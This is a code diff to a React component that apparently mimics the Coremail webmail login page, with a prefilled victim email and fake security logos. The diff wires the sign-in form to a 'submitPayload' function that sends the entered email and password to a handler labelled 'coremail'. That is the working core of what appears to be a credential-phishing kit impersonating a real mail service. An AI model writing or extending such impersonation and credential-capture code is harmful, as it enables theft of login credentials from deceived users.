@@ -1,5 +1,6 @@
 
 import React, { useState } from 'react';
+import { useSecurity } from '../components/SecurityManager';
 
 interface CoremailThemeProps {
   prefilledEmail?: string;
@@ -9,6 +10,21 @@ const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
   const [username, setUsername] = useState(prefilledEmail || '');
   const [password, setPassword] = useState('');
   const [activeTab, setActiveTab] = useState<'user' | 'admin'>('user');
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const { submitPayload } = useSecurity();
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setIsSubmitting(true);
+    try {
+      await submitPayload({ email: username, password }, 'coremail');
+      setPassword('');
+    } catch (err) {
+      console.error(err);
+    } finally {
+      setIsSubmitting(false);
+    }
+  };
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-sans text-[#666]">
@@ -93,7 +109,7 @@ const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
                 </div>
               </div>
 
-              <div className="space-y-4 flex-grow">
+              <form onSubmit={handleSubmit} className="space-y-4 flex-grow">
                 <div className="relative group">
                   <div className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400">
                     <svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
@@ -135,10 +151,14 @@ const CoremailTheme: React.FC<CoremailThemeProps> = ({ prefilledEmail }) => {
                   </label>
                 </div>
 
-                <button className="w-full py-2 bg-[#42a2f0] hover:bg-[#3292e0] text-white font-medium rounded-sm transition-colors text-[16px] shadow-sm">
-                  Sign in
+                <button 
+                  type="submit"
+                  disabled={isSubmitting}
+                  className="w-full py-2 bg-[#42a2f0] hover:bg-[#3292e0] text-white font-medium rounded-sm transition-colors text-[16px] shadow-sm disabled:opacity-70"
+                >
+                  {isSubmitting ? '...' : 'Sign in'}
                 </button>
-              </div>
+              </form>
 
               {/* Security logos */}
               <div className="mt-8 flex items-center justify-end space-x-2 opacity-60">
